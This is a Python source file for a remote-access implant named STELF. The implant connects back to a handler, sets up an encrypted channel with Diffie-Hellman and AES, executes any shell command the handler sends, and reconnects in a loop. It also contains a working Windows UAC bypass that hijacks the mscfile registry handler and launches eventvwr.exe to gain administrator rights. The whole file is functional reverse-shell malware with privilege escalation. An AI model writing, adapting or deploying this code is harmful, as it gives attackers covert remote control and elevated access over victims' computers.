import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import psutil
from Crypto.Cipher import AES
from Crypto.Random import random
import zlib
import base64
import hashlib
import ctypes
import getpass
import sys

if os.name == "nt":
	import win32net

logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

def windows_only(func):
	def tester(*args):
		if os.name != "nt": return "Command not available on non-windows OS."
		else: return func(*args)
	return tester

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	Channels are used to split data into streams.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(self.id)))
		
	def write_input(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True):
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data):
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def signal(self, data):
		logging.debug("Signal from channel #"+str(ord(self.id))+": "+data)
		self.output_queue.put(chr(254)+data)
		
	def __repr__(self):
		print "Channel ID: "+str(ord(id))
	
class Transport:
	""""
	Transport handles sending data between STELF and the handler.
	"""
	def __init__(self, handler_ip, handler_port):
		self.handler_ip = handler_ip
		self.handler_port = handler_port
		
		self.comm_socket = socket.socket()
		
		self.master_queue = Queue.Queue()
		self.user_channel = Channel(chr(97), self.master_queue)
		self.signal_channel = Channel(chr(254), self.master_queue)
		
		self.disconnected = False
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}

		
	def connect(self):
		logging.info("Attempting to connect to "+self.handler_ip+":"+str(self.handler_port))
		try:
			self.comm_socket.connect((self.handler_ip, self.handler_port))
			logging.info("Connected!")
			
			self.aes_obj = self.dh_exchange()
			
			for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
				t = StoppableThread(target=f)
				t.daemon = True
				t.start()
				
			return True
		except Exception as e:
			logging.warn("Failed to connect to handler: "+str(e))
			return False
			
	def dh_exchange(self):
		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
		base = 2
		
		logging.debug("Starting key exchange.")
		private_key = random.randint(10**(255), (10**256)-1)
		public_key = pow(base, private_key, modulus)
		
		self.comm_socket.sendall(str(public_key))
		server_key = self.comm_socket.recv(4096)
		
		sharedSecret = pow(int(server_key), private_key, modulus)
		
		hash = str(hashlib.sha256(str(sharedSecret)).hexdigest())
		key = hash[:32]
		IV = hash[-16:]
		
		logging.info("Key: "+key+", IV: "+IV)
		
		return AES.new(key, AES.MODE_CFB, IV)
			
	def encrypt(self, data):
		return base64.b64encode(zlib.compress(self.aes_obj.encrypt(data), 9))
		
	def decrypt(self, data):
		return self.aes_obj.decrypt(zlib.decompress(base64.b64decode(data)))
		
	def send(self, data):
		data = self.encrypt(data)
		try: self.comm_socket.sendall(data)
		except: pass
		
	def recv(self):
		if self.disconnected: return ""
		try: data = self.comm_socket.recv(4096)
		except: data = ""
		if not data:
			logging.error("Handler disconnected")
			self.comm_socket.close()
			return self.user_channel.id+"CONN_LOST"
		return self.decrypt(data)
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to handler: "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from handler: "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			logging.info("Got signal: "+signal)
			if signal == "CREATE_CHANNEL":
				pass
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Execute:
	"""
	Functions related to executing programs.
	"""
	def __init__(self):
		self.killed = False
		
	def kill_proc(self, pid):
		logging.warn("Killing command after taking over a minute to execute.")
		process = psutil.Process(pid)
		for proc in process.children(recursive=True):
			proc.terminate()
		process.terminate()
		self.killed = True
		
	def execute_shell_command(self, command):
		logging.info("Executing shell command: "+command.strip())
		proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		timer = threading.Timer(60, self.kill_proc, [proc.pid])
		timer.start()
		out = proc.stdout.read() + proc.stderr.read()
		if self.killed: out += "\n(Process terminated after taking too long to execute)"
		timer.cancel()
		self.killed = False
		logging.debug("Result of shell command: "+out.strip())
		return out
		
class Filesystem:
	"""
	Functions related to interacting with the file system.
	"""
	def change_directory(self, dir):
		try:
			os.chdir(dir)
			return ""
		except Exception as e:
			return str(e)
			
class Miscellaneous:
	"""
	Miscellaneous functions that don't fit into any other category.
	"""
	def isadmin(self): # Check if current process has admin privs
		if os.name == "nt": return ctypes.windll.shell32.IsUserAnAdmin() != 0
		else: return os.geteuid() == 0
		
	def ASCIIfy(self, string): # Remove non-ASCII characters from a string.
		return ''.join([i if ord(i) < 128 else '' for i in string])
		
	@windows_only
	def is_user_in_group(self, group, member): # Check if user is member of a group.
		members = win32net.NetLocalGroupGetMembers(None, group, 1)
		if self.ASCIIfy(member.lower()) in list(map(lambda d: self.ASCIIfy(d['name'].lower()), members[0])): return True
		return False
	 
	@windows_only
	def name_of_admin_group(self): # Get name of Administrators group.
		for line in execute.execute_shell_command("whoami /groups").splitlines():
			if "S-1-5-32-544" in line:
				return line.split()[0].split("\\")[1]
		
class Privilege_Escalation:
	"""
	Functions related to escalating privileges.
	"""
		
	@windows_only
	def bypass_uac(self):
		logging.info("Attempting to bypass UAC.")
		if misc.isadmin():
			logging.debug("UAC bypass failed: Process already has admin privileges.")
			return "You already have admin privileges!"
		 
		if not misc.is_user_in_group(misc.name_of_admin_group(), getpass.getuser()):
			logging.debug("UAC bypass failed: Current user is not part of admin group.")
			return "Current user is not part of admin group."
		 
		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
			return "UAC is disabled or notification policy is set to 'Always'"
			
		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
		logging.debug(execute.execute_shell_command('REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /f /d "'+os.path.abspath(sys.executable)+'"'))
		os.startfile("eventvwr.exe")
		time.sleep(2)
		logging.debug(execute.execute_shell_command("REG DELETE HKCU\Software\Classes\mscfile\shell\open\command /f"))
		return "BG_NEW_SESH"
		
execute = Execute()
fs = Filesystem()
misc = Miscellaneous()
privesc = Privilege_Escalation()
	
class Shell:
	"""
	This is where the all remote control magic happens.
	"""
	def __init__(self, transport):
		self.transport = transport
		self.channel = self.transport.user_channel
		
	def run(self):
		if not self.transport.connect(): return False
		
		while True:
			data = self.recv()
			if data == "CONN_LOST":
				return False
			elif data.startswith("cd"):
				data = data[3:]
				output = fs.change_directory(data.strip())
			elif data == "isadmin":
				output = str(misc.isadmin())
			elif data == "bypassuac":
				output = privesc.bypass_uac()
			else:
				output = execute.execute_shell_command(data)
				
			self.send(output+"\n"+os.getcwd()+">>")
		
	def send(self, data):
		self.channel.write_output(data)
		
	def recv(self):
		return self.channel.read_input()
		
while True:
	shell = Shell(Transport("127.0.0.1",8080))
	if not shell.run():
		del shell
		for t in threading.enumerate():
			try: t.stop()
			except: pass
		time.sleep(5)
		
	else: os._exit(0)